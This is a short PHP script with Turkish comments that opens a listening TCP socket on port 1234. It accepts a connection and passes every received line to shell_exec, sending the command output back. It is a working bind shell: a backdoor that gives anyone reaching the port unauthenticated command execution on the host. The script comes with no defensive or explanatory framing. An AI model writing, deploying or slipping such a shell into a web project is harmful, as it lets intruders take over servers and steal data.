<?php
set_time_limit(0);
$ip = '127.0.0.1';  // Dinleme yapacağınız IP adresi
$port = 1234;       // Dinleme yapacağınız port numarası

// Soket oluştur
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($sock === false) {
    die("Socket oluşturulamadı: " . socket_strerror(socket_last_error()));
}

// Dinlemeye başla
if (socket_bind($sock, $ip, $port) === false) {
    die("Socket bind hatası: " . socket_strerror(socket_last_error($sock)));
}

if (socket_listen($sock, 3) === false) {
    die("Socket listen hatası: " . socket_strerror(socket_last_error($sock)));
}

echo "Dinleniyor $ip:$port...\n";

$client = socket_accept($sock);
if ($client === false) {
    die("Socket kabul hatası: " . socket_strerror(socket_last_error($sock)));
}

echo "Bağlantı kabul edildi!\n";

while (true) {
    $input = socket_read($client, 1024);
    if ($input === false) {
        break;
    }
    
    // Komut çalıştır ve sonucu al
    $output = shell_exec($input);
    socket_write($client, $output, strlen($output));
}

socket_close($client);
socket_close($sock);
?>
